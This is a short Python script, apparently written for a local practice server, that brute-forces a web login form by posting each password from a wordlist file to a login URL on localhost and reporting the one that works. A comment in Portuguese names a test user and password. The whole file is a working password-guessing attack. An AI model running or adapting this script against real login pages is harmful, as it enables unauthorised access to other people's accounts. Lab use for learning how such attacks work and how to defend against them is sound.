import requests

# Para o test_server User: Dalida - Senha: 123456

target_url = "http://127.0.0.1:5000/login"
username = input("Enter Username For Target Page: ")

try:
    def send_request(username, target_url):
        for password in passwords:
            password = password.strip('\n')
            print(f"Testing Password: {password}")
            dataPayload = {"username":username, "password":password, "Login":"submit"}
            response = requests.post(target_url, data=dataPayload)
            if b"Login failed" in response.content:
                print(f"{password} is not the password of {username}")
            else:
                print(f"The target username: {username} uses the password {password}")
                exit()
except:
    print("Password was not found in the list")

with open("passw_list.txt", "r") as passwords:
   send_request(username, target_url)

